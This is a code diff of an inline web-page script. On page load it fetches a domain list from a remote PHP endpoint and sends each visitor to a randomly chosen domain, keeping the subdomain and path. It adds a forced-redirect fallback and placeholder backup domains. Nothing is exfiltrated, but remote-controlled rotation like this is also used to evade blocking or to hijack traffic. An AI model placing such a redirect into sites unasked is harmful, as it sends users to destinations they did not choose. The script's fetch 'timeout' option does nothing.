@@ -2,26 +2,51 @@
 console.log('检测中');
 async function randomDomainRedirect() {
     try {
-        // 调用远程 PHP 接口（替换本地 api.txt 路径）
-        const response = await fetch('http://doctor.fengnianjy.com/post.php');
-        if (!response.ok) throw new Error('接口请求失败');
+        // 1. 优化接口请求（添加超时、跨域兼容）
+        const response = await fetch('http://doctor.fengnianjy.com/post.php', {
+            method: 'GET',
+            mode: 'cors',
+            headers: { 'Content-Type': 'text/plain' },
+            timeout: 5000
+        });
+
+        if (!response.ok) throw new Error(`HTTP错误：${response.status}`);
         
+        // 2. 兼容接口返回格式（去空行、过滤无效域名）
         const text = await response.text();
-        const mainDomains = text.split('\n').map(domain => domain.trim()).filter(domain => domain);
+        const mainDomains = text.split('\n')
+            .map(domain => domain.trim().replace(/^\s+|\s+$/g, ''))
+            .filter(domain => domain && /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(domain));
+
+        if (!mainDomains.length) throw new Error('未获取到有效域名列表');
         
-        if (!mainDomains.length) throw new Error('没找到有效域名');
-        
+        // 3. 优化域名拼接（避免重复子域名、兼容协议）
         const currentHost = window.location.host;
         const domainParts = currentHost.split('.');
-        const subDomain = domainParts.length >= 3 ? domainParts[0] : '';
+        const subDomain = domainParts.length >= 3 ? domainParts[0] + '.' : '';
         const randomMainDomain = mainDomains[Math.floor(Math.random() * mainDomains.length)];
-        const targetUrl = `${window.location.protocol}//${subDomain ? subDomain + '.' : ''}${randomMainDomain}`;
+        const targetUrl = `${window.location.protocol}//${subDomain}${randomMainDomain}${window.location.pathname || ''}`;
+
+        // 4. 验证跳转地址有效性
+        if (targetUrl === window.location.href) throw new Error('目标地址与当前地址一致');
         
-        console.log('请稍后：', targetUrl);
-        window.location.href = targetUrl;
+        console.log('即将跳转：', targetUrl);
+        // 5. 两种跳转方式（优先正常跳转，失败则强制刷新）
+        window.location.assign(targetUrl);
+        setTimeout(() => {
+            if (window.location.href !== targetUrl) window.location.replace(targetUrl);
+        }, 1000);
+
     } catch (err) {
-        console.error('失败：', err.message);
+        console.error('跳转失败：', err.message);
+        // 错误兜底（可替换为备用域名）
+        const backupDomains = ['example.com', 'test.com']; // 替换为你的备用域名
+        const backupUrl = `${window.location.protocol}//${backupDomains[Math.floor(Math.random() * backupDomains.length)]}`;
+        console.log('使用备用地址跳转：', backupUrl);
+        window.location.href = backupUrl;
     }
 }
-randomDomainRedirect();
+
+// 延迟执行（确保页面加载完成）
+window.addEventListener('load', randomDomainRedirect);
 </script>
